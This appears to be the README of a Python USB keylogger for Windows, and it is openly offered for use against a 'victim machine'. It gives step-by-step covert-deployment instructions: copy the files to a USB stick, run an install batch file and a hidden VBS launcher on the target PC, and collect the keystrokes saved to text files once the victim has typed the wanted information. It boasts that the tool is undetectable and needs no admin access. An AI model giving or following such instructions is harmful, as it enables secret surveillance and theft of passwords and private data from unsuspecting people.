//////////USB Keylogger With Python///////////////

# Works for Windows only!!
# This script is made with Python, so it's will not work if Python was not installed in the victim machine
# You can download Python in: https://python.org/

-----------------------

Prepare the USB:
1. Just copy past the files into the USB ez :D, you may ignore "README" if you want.

-----------------------

To run: 
1. Plug the usb in the victim machine
2. Launch "install.bat" if its your first time use in a pc (will need a little of network to download the "keyboard-pkg")
3. Start "Start!.vbs"
4. You are ready to go xD. (the task is hiding in the background, shuuuut you cant see it ;)  )
# The keystrokes are saved in ".txt" files in the USB
Once your victim has typed the info you need. Wait average ~60 secs (go for a walk) before you unplug the USB.
Not detectable (because its too simple to be considered as a malware), and don't need admin access (WoNdErFul)

Enjoy ^^
